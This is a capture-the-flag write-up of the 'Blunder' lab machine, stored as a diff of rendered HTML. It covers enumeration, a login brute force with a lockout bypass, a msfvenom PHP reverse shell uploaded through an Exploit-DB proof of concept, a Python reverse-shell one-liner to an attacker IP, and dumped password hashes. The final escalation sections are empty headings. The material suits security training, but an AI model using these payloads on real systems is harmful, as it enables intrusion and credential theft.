@@ -1,0 +1,310 @@
+I"#X<h1 id="blunder-">Blunder <br /></h1>
+
+<p><img src="images/blunder/1.png# icon" alt="Blunder icon" /></p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<h3 id="nmap">NMAP</h3>
+<p>Let’s start with the following nmap execution
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p</span> 1-10000 <span class="nt">-oA</span> nmap.res <span class="nt">-v</span> blunder.htb
+</code></pre></div></div>
+<p><br />It then yielded the following result.
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.80 scan initiated Sun Sep 13 13:55:12 2020 as: nmap -sS -sV -sC -p 1-10000 -oA nmap.res -v blunder.htb</span>
+Nmap scan report <span class="k">for </span>blunder.htb <span class="o">(</span>10.10.10.191<span class="o">)</span>
+Host is up <span class="o">(</span>0.29s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 9998 filtered ports
+PORT   STATE  SERVICE VERSION
+21/tcp closed ftp
+80/tcp open   http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-favicon: Unknown favicon MD5: A0F0E5D852F0E3783AF700B6EE9D00DA
+|_http-generator: Blunder
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Blunder | A blunder of interesting facts
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sun Sep 13 13:57:23 2020 -- 1 IP address (1 host up) scanned in 130.83 seconds</span>
+</code></pre></div></div>
+<p><br />It turns out that the webserver is the only opened port. Let’s enumerate it.</p>
+
+<h3 id="web-pages-enumeration">Web Pages Enumeration</h3>
+
+<p>Upon visiting the website, here is the home page.<br />
+<img src="images/blunder/2.png" alt="Home Page" />
+<br />At a first look, it’s seems to be a blog website with quite a few links around it. Let’s do web files/dirs enumeration against it using <a href="https://github.com/ffuf/ffuf">ffuf</a></p>
+<h4 id="ffuf-result-using-dirbcommontxt">FFUF Result using dirb/common.txt</h4>
+<p>Let’s run ffuf fuzzer against it to discover some web files or hidden directories. Let’s look for <strong><code class="language-plaintext highlighter-rouge">.php</code></strong>,<strong><code class="language-plaintext highlighter-rouge">.txt</code></strong>, and <strong><code class="language-plaintext highlighter-rouge">.html</code></strong> files.
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ffuf <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-e</span> .php,.html,.txt <span class="nt">-u</span> http://blunder.htb/FUZZ <span class="nt">-o</span> ffuf-res.txt
+</code></pre></div></div>
+<p><br />By running the following command, we can check what files or directories found by the fuzzer.
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 <span class="nt">-m</span> json.tool ffuf-res.txt | <span class="nb">grep</span> <span class="s2">"FUZZ.*$"</span> <span class="nt">-o</span>
+FUZZ <span class="nt">-o</span> ffuf-res.txt<span class="s2">",
+FUZZ"</span>: <span class="s2">".html"</span>
+FUZZ<span class="s2">": ""
+FUZZ"</span>: <span class="s2">".hta"</span>
+FUZZ<span class="s2">": "</span>.php<span class="s2">"
+FUZZ"</span>: <span class="s2">".hta.php"</span>
+FUZZ<span class="s2">": "</span>.htaccess.txt<span class="s2">"
+FUZZ"</span>: <span class="s2">".hta.html"</span>
+FUZZ<span class="s2">": "</span>.hta.txt<span class="s2">"
+FUZZ"</span>: <span class="s2">".htaccess"</span>
+FUZZ<span class="s2">": "</span>.htaccess.html<span class="s2">"
+FUZZ"</span>: <span class="s2">".htaccess.php"</span>
+FUZZ<span class="s2">": "</span>.htpasswd<span class="s2">"
+FUZZ"</span>: <span class="s2">".htpasswd.php"</span>
+FUZZ<span class="s2">": "</span>.htpasswd.html<span class="s2">"
+FUZZ"</span>: <span class="s2">".htpasswd.txt"</span>
+FUZZ<span class="s2">": "</span>0<span class="s2">"
+FUZZ"</span>: <span class="s2">"about"</span>
+FUZZ<span class="s2">": "</span>admin<span class="s2">"
+FUZZ"</span>: <span class="s2">"cgi-bin/"</span>
+FUZZ<span class="s2">": "</span>install.php<span class="s2">"
+FUZZ"</span>: <span class="s2">"LICENSE"</span>
+FUZZ<span class="s2">": "</span>robots.txt<span class="s2">"
+FUZZ"</span>: <span class="s2">"robots.txt"</span>
+FUZZ<span class="s2">": "</span>server-status<span class="s2">"
+FUZZ"</span>: <span class="s2">"todo.txt"</span>
+FUZZ<span class="s2">",
+FUZZ"</span>,
+FUZZ <span class="nt">-o</span> ffuf-res.txt<span class="s2">",
+</span></code></pre></div></div>
+<p><br />We can see some interesting files in here but we are only interested at <strong><code class="language-plaintext highlighter-rouge">todo.txt</code></strong> and <strong><code class="language-plaintext highlighter-rouge">/admin</code></strong></p>
+<h5 id="username-in-todotxt">Username in todo.txt</h5>
+<p>Let’s check <strong><code class="language-plaintext highlighter-rouge">todo.txt</code></strong>.<br />
+<img src="images/blunder/3.png# medium" alt="todo.txt page" />
+<br />It seems that a person named <strong><code class="language-plaintext highlighter-rouge">fergus</code></strong> is part of the development team. It can be a potential username late for bruteforcing credentials if needed.</p>
+
+<h5 id="bludit-page-through-admin">Bludit Page through /admin</h5>
+<p>Another thing to look at is the <strong><code class="language-plaintext highlighter-rouge">/admin</code></strong>. Upon visiting, we are greeted with this page.<br />
+<img src="images/blunder/4.png# medium" alt="Bludit login page" />
+<br />We’ve got a possible username earlier! We just have to find the password.</p>
+<h2 id="bruteforcing-login-bludit-with-custom-wordlist">Bruteforcing Login Bludit With Custom Wordlist</h2>
+
+<h3 id="getting-all-alnum-strings-from-homepage">Getting All Alnum Strings From Homepage</h3>
+<p>We will use the alphanumerical strings we have from the homepage html and create a custom password wordlist from it. We can use the following commands to do just that.
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://blunder.htb/ | <span class="nb">grep</span> <span class="nt">-P</span> <span class="s2">"[a-zA-Z0-9]+"</span> <span class="nt">-o</span> | <span class="nb">sort</span> <span class="nt">-u</span> | <span class="nb">uniq</span> <span class="o">&gt;</span> wordlist.txt
+</code></pre></div></div>
+<h3 id="bruteforcing-to-bludit-login">Bruteforcing to Bludit Login</h3>
+<p>Now that we have a username and a password list, let’s create a bruteforcing script for bludit login. Also, we need to be careful about the bruteforce mitigation done by the bludit.</p>
+
+<h4 id="bypassing-the-bruteforce-mitigation">Bypassing The Bruteforce Mitigation</h4>
+<p>There is an existing script for bruteforce mitigation bypass. Can be found <a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">here</a>. It’s cool! Please, give it a read :D. (TL;DR - X-Forwarded-For header is being checked if is set and thus used for locking out. It can be spoofed thus the lockout count goes to the spoofed IP instead of our original IP).<br />
+Let’s try it!
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 bruteforce.py users.txt wordlist.txt
+</code></pre></div></div>
+<p><br />
+<strong><em>Note: I modified the original code to accept a users list file and passwords list file and then submit the contents. If you want to check it out, you can go to insert link <a href="localhost">here</a></em></strong>.
+<br />After a while, we got this
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying: fergus:resolution
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying: fergus:resolutions
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying: fergus:Richard
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying: fergus:Right
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying: fergus:Robots
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying: fergus:RolandDeschain
+
+SUCCESS: Password found!
+Use fergus:RolandDeschain to login.
+
+</code></pre></div></div>
+<p><br />Let’s check the credentials.<br />
+<img src="images/blunder/6.png" alt="Bludit login" />
+<br />It worked!</p>
+
+<h2 id="bludit-vulnerability">Bludit Vulnerability</h2>
+
+<h3 id="directory-traversal-vulnerability--file-upload">Directory Traversal Vulnerability + File Upload</h3>
+<p>It turns out this version of Bludit is vulnerable to Directory Traversal and File Upload. The POC can be found <a href="https://www.exploit-db.com/exploits/48701">here</a></p>
+
+<h3 id="creating-a-php-reverse-payload-to-be-uploaded-and-htaccess">Creating a PHP Reverse Payload To Be uploaded and .htaccess</h3>
+<p>Once we downloaded the file, we have to craft <strong><em>PHP Reverse Shell</em></strong> to be uploaded with an extension of <strong><code class="language-plaintext highlighter-rouge">png</code></strong>. To craft:
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> php/reverse_php <span class="nv">LHOST</span><span class="o">=</span>10.10.14.30 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> raw <span class="nt">-b</span> <span class="s1">'"'</span> <span class="o">&gt;</span> bg2.png
+<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"&lt;?php </span><span class="si">$(</span><span class="nb">cat </span>bg2.png<span class="si">)</span><span class="s2">"</span> <span class="o">&gt;</span> bg2.png
+</code></pre></div></div>
+<p><br />Now, we need to create the .htaccess to execute png files as php files. To create:
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"RewriteEngine off"</span> <span class="o">&gt;</span> .htaccess
+<span class="nb">echo</span> <span class="s2">"AddType application/x-httpd-php .png"</span> <span class="o">&gt;&gt;</span> .htaccess
+</code></pre></div></div>
+<p><br />These instructions are also available at the POC script.</p>
+
+<h3 id="setting-up-poc">Setting up POC</h3>
+<p>Now, we have to set the stuff inside the POC script. Set the following:
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+url <span class="o">=</span> <span class="s1">'http://blunder.htb'</span> 
+username <span class="o">=</span> <span class="s1">'fergus'</span>
+password <span class="o">=</span> <span class="s1">'RolandDeschain'</span>
+</code></pre></div></div>
+
+<h3 id="executing-poc">Executing POC</h3>
+
+<h4 id="set-netcat-listener">Set Netcat Listener</h4>
+<p>Set a Listener for our reverse shell:
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lvp</span> 4444
+Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+</code></pre></div></div>
+<h4 id="execute-the-python-poc-script">Execute the Python POC Script</h4>
+<p>The first line is the execution and the following are the result.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 48701.py 
+cookie: 88idvf1680258henlbbtv5dj35
+csrf_token: f5781f263dbc70342153aef5aa39d9aed33f71cb
+Uploading payload: bg2.png
+Uploading payload: .htaccess
+</code></pre></div></div>
+<p><br />Now, we have to trigger the reverse shell.</p>
+<h4 id="triggering-reverse-shell">Triggering Reverse Shell</h4>
+<p>To trigger our payload, we have to go to <strong><code class="language-plaintext highlighter-rouge">/bl-content/tmp/temp/bg2.png</code></strong>. After that, we should be able to receive a shell to our netcat listener.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lvp</span> 4444
+Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.10.191.
+Ncat: Connection from 10.10.10.191:60720.
+</code></pre></div></div>
+
+<h3 id="reverse-shell-for-better-tty-using-python3">Reverse Shell For Better TTY Using Python3</h3>
+<p>After receiving the shell, we will have a limited tty. Let’s spawn a better tty. Let’s another netcat listener.
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvp</span> 5555
+Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::5555
+Ncat: Listening on 0.0.0.0:5555
+</code></pre></div></div>
+<p><br />And at out current shell, we’ll use the following python command:
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.30",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span>
+</code></pre></div></div>
+<p><br />And here is what we should be receiving from our new netcat listener.
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lvp</span> 5555
+Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::5555
+Ncat: Listening on 0.0.0.0:5555
+Ncat: Connection from 10.10.10.191.
+Ncat: Connection from 10.10.10.191:57214.
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1096<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp/temp<span class="err">$</span>
+</code></pre></div></div>
+<p><br />Now we have a better tty!</p>
+
+<h2 id="privesc-enumeration-as-www-data">Privesc Enumeration as www-data</h2>
+<p>Let’s just snoop around in our web directory. After snooping around, we can actuall get 2 password hashes.</p>
+
+<h3 id="password-hash-in-bludit-392bl-contentdatabases">Password hash in bludit-3.9.2/bl-content/databases</h3>
+<p>We can get that password hash from <strong><code class="language-plaintext highlighter-rouge">/var/www/bludit-3.9.2/bl-content/databases/users.php</code></strong>
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases<span class="nv">$ </span><span class="nb">cat </span>users.php
+<span class="nb">cat </span>users.php
+&lt;?php defined<span class="o">(</span><span class="s1">'BLUDIT'</span><span class="o">)</span> or die<span class="o">(</span><span class="s1">'Bludit CMS.'</span><span class="o">)</span><span class="p">;</span> ?&gt;
+<span class="o">{</span>
+    <span class="s2">"admin"</span>: <span class="o">{</span>
+        <span class="s2">"nickname"</span>: <span class="s2">"Admin"</span>,
+        <span class="s2">"firstName"</span>: <span class="s2">"Administrator"</span>,
+        <span class="s2">"lastName"</span>: <span class="s2">""</span>,
+        <span class="s2">"role"</span>: <span class="s2">"admin"</span>,
+        <span class="s2">"password"</span>: <span class="s2">"bfcc887f62e36ea019e3295aafb8a3885966e265"</span>,
+        <span class="s2">"salt"</span>: <span class="s2">"5dde2887e7aca"</span>,
+        <span class="s2">"email"</span>: <span class="s2">""</span>,
+        <span class="s2">"registered"</span>: <span class="s2">"2019-11-27 07:40:55"</span>,
+        <span class="s2">"tokenRemember"</span>: <span class="s2">""</span>,
+        <span class="s2">"tokenAuth"</span>: <span class="s2">"b380cb62057e9da47afce66b4615107d"</span>,
+        <span class="s2">"tokenAuthTTL"</span>: <span class="s2">"2009-03-15 14:00"</span>,
+        <span class="s2">"twitter"</span>: <span class="s2">""</span>,
+        <span class="s2">"facebook"</span>: <span class="s2">""</span>,
+        <span class="s2">"instagram"</span>: <span class="s2">""</span>,
+        <span class="s2">"codepen"</span>: <span class="s2">""</span>,
+        <span class="s2">"linkedin"</span>: <span class="s2">""</span>,
+        <span class="s2">"github"</span>: <span class="s2">""</span>,
+        <span class="s2">"gitlab"</span>: <span class="s2">""</span>
+    <span class="o">}</span>,
+    <span class="s2">"fergus"</span>: <span class="o">{</span>
+        <span class="s2">"firstName"</span>: <span class="s2">""</span>,
+        <span class="s2">"lastName"</span>: <span class="s2">""</span>,
+        <span class="s2">"nickname"</span>: <span class="s2">""</span>,
+        <span class="s2">"description"</span>: <span class="s2">""</span>,
+        <span class="s2">"role"</span>: <span class="s2">"author"</span>,
+        <span class="s2">"password"</span>: <span class="s2">"be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7"</span>,
+        <span class="s2">"salt"</span>: <span class="s2">"jqxpjfnv"</span>,
+        <span class="s2">"email"</span>: <span class="s2">""</span>,
+        <span class="s2">"registered"</span>: <span class="s2">"2019-11-27 13:26:44"</span>,
+        <span class="s2">"tokenRemember"</span>: <span class="s2">""</span>,
+        <span class="s2">"tokenAuth"</span>: <span class="s2">"0e8011811356c0c5bd2211cba8c50471"</span>,
+        <span class="s2">"tokenAuthTTL"</span>: <span class="s2">"2009-03-15 14:00"</span>,
+        <span class="s2">"twitter"</span>: <span class="s2">""</span>,
+        <span class="s2">"facebook"</span>: <span class="s2">""</span>,
+        <span class="s2">"codepen"</span>: <span class="s2">""</span>,
+        <span class="s2">"instagram"</span>: <span class="s2">""</span>,
+        <span class="s2">"github"</span>: <span class="s2">""</span>,
+        <span class="s2">"gitlab"</span>: <span class="s2">""</span>,
+        <span class="s2">"linkedin"</span>: <span class="s2">""</span>,
+        <span class="s2">"mastodon"</span>: <span class="s2">""</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p><br />We already knew fergus’ password so let’s collect the admin one</p>
+
+<h3 id="password-hash-in-bludit-3100abl-contentdatabases">Password hash in bludit-3.10.0a/bl-content/databases</h3>
+<p>Just outside of bludit-3.9.2, there is another bludit version 3.10.0a. There is also another password hash in the same file.
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases<span class="nv">$ </span><span class="nb">cat </span>users.php
+<span class="nb">cat </span>users.php
+&lt;?php defined<span class="o">(</span><span class="s1">'BLUDIT'</span><span class="o">)</span> or die<span class="o">(</span><span class="s1">'Bludit CMS.'</span><span class="o">)</span><span class="p">;</span> ?&gt;
+<span class="o">{</span>
+    <span class="s2">"admin"</span>: <span class="o">{</span>
+        <span class="s2">"nickname"</span>: <span class="s2">"Hugo"</span>,
+        <span class="s2">"firstName"</span>: <span class="s2">"Hugo"</span>,
+        <span class="s2">"lastName"</span>: <span class="s2">""</span>,
+        <span class="s2">"role"</span>: <span class="s2">"User"</span>,
+        <span class="s2">"password"</span>: <span class="s2">"faca404fd5c0a31cf1897b823c695c85cffeb98d"</span>,
+        <span class="s2">"email"</span>: <span class="s2">""</span>,
+        <span class="s2">"registered"</span>: <span class="s2">"2019-11-27 07:40:55"</span>,
+        <span class="s2">"tokenRemember"</span>: <span class="s2">""</span>,
+        <span class="s2">"tokenAuth"</span>: <span class="s2">"b380cb62057e9da47afce66b4615107d"</span>,
+        <span class="s2">"tokenAuthTTL"</span>: <span class="s2">"2009-03-15 14:00"</span>,
+        <span class="s2">"twitter"</span>: <span class="s2">""</span>,
+        <span class="s2">"facebook"</span>: <span class="s2">""</span>,
+        <span class="s2">"instagram"</span>: <span class="s2">""</span>,
+        <span class="s2">"codepen"</span>: <span class="s2">""</span>,
+        <span class="s2">"linkedin"</span>: <span class="s2">""</span>,
+        <span class="s2">"github"</span>: <span class="s2">""</span>,
+        <span class="s2">"gitlab"</span>: <span class="s2">""</span><span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p><br />It’s for Hugo. If we are able to crack it, we can switch to user Hugo</p>
+
+<h2 id="cracking-found-hashes-with-john-the-ripper">Cracking Found Hashes with John The Ripper</h2>
+<p>We collected our hashes and stored in <strong><code class="language-plaintext highlighter-rouge">hashes.txt</code></strong>:
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>hashes.txt 
+admin:bfcc887f62e36ea019e3295aafb8a3885966e265
+hugo:faca404fd5c0a31cf1897b823c695c85cffeb98d
+</code></pre></div></div>
+
+<h2 id="escalating-from-www-data-to-hugo">Escalating from www-data to hugo</h2>
+
+<h2 id="privesc-enumeration-as-hugo">Privesc Enumeration as hugo</h2>
+
+<h3 id="list-sudo-privileges">List Sudo privileges</h3>
+
+<h2 id="sudo-vulnerability">Sudo Vulnerability</h2>
+
+<h2 id="escalating-from-hugo-to-root">Escalating from hugo to root</h2>
+
+<h3 id="sudo-exploit">Sudo Exploit</h3>
+
+:ET
